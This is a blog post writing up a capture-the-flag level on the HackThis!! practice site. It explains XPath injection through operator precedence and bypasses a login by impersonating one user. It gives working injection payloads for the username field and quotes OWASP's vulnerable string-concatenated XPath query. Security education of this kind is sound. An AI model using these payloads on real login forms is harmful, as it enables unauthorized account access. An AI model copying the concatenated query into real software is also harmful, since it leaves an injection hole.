---
layout: post
title:  "HackThis!! :: Intermediate :: Level 6"
date:   2016-05-09
---

[HackThis!! Intermediate](https://www.hackthis.co.uk/levels/Intermediate)

## Intermediate Level 6

![intermediate06-01](/img/hackthis-intermediate/intermediate06-01.png)

No SQLi, check.  Hint?

![intermediate06-02](/img/hackthis-intermediate/intermediate06-02.png)

The Pastebin contains an XML schema...

```
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="users">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="user">
          <xs:complexType>
            <xs:sequence>
              <xs:element type="xs:string" name="login"/>
              <xs:element type="xs:string" name="password"/>
              <xs:element type="xs:string" name="realname"/>
            </xs:sequence>
          </xs:complexType>
        </xs:element>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>
```

[XML injection ](https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OWASP-DV-008%29) seems like a good place to start but it doesn't quite fit the context. The top many results if you Google "XML injection login bypass" reference XPATH injection including the [OWASP XPath Injection Testing Guide](https://www.owasp.org/index.php/Testing_for_XPath_Injection_%28OTG-INPVAL-010%29), that sounds better.

OWASP sums it up nicely:

"Querying XML is done with XPath, a type of simple descriptive statement that allows the XML query to locate a piece of information. Like SQL, you can specify certain attributes to find, and patterns to match. When using XML for a web site it is common to accept some form of input on the query string to identify the content to locate and display on the page. This input must be sanitized to verify that it doesn't mess up the XPath query and return the wrong data." ([source](https://www.owasp.org/index.php/XPATH_Injection))

The sample implementation and exploit on the [OWASP page](https://www.owasp.org/index.php/XPATH_Injection) works on this level with a minor modification.

Assuming the application is coded in a very straightforward way, it might look like this:

```
FindUserXPath = "//Employee[UserName/text()='" & Request("Username") & "' And 
        Password/text()='" & Request("Password") & "']"
```

OWASP suggests the following attack and shows how the malformed input is parsed to modify the XPath.

```
Username: blah' or 1=1 or 'a'='a
Password: blah

FindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 
        'a'='a' And Password/text()='blah']

Logically this is equivalent to:
        //Employee[(UserName/text()='blah' or 1=1) or 
        ('a'='a' And Password/text()='blah')]
```

The reason the last part is 'logically equivalent' to the previous is operator precedence in XPath, described [here](http://www.w3.org/TR/xpath/#booleans). AND has a higher precedence than OR. So,

```
//Employee[UserName/text()='blah' or 1=1 or 'a'='a' And Password/text()='blah']
```

becomes

```
//Employee[UserName/text()='blah' or 1=1 or ('a'='a' And Password/text()='blah')]
```

because AND is first. Left with three items to OR, they are evaluated left to right, so:

```
//Employee[(UserName/text()='blah' or 1=1) or ('a'='a' And Password/text()='blah')]
```

I think it's really cool that we inject `1=1` and also `a=a` into the username field but they end up contributing to different clauses in the statement.

Unfortunately this does not work!  It should match and return every username regardless of password input. Presumably this application is built to require a match on only a single record, or specifically that it match Sandra Murphy's account.

We'll use the same idea but swap out the `1=1` for an attempt to match the `realname` field (from the XML schema) to Sandra.

```
Username: blah' or realname/text()='Sandra Murphy' or 'a'='a
Password: blah
```

Assuming the same XPath expression as in the OWASP example, this will look like this:

```
//Employee[UserName/text()='blah' or realname/text()='Sandra Murphy' or 'a'='a' And Password/text()='blah']
```

Which, following the same steps to add parenthesis according to AND/OR operator precedence, is logically the following:

```
//Employee[UserName/text()='blah' or realname/text()='Sandra Murphy' or ('a'='a' And Password/text()='blah')]
```

```
//Employee[(UserName/text()='blah' or realname/text()='Sandra Murphy') or ('a'='a' And Password/text()='blah')]
```

Looks good. Construct a POST request with this username and password and send it along...

![intermediate06-03](/img/hackthis-intermediate/intermediate06-03.png)

BOOM, success. Again, this works because the first clause passes on `realname` being Sandra Murphy, and the second clause passes on `a=a`.

![intermediate06-04](/img/hackthis-intermediate/intermediate06-04.png)

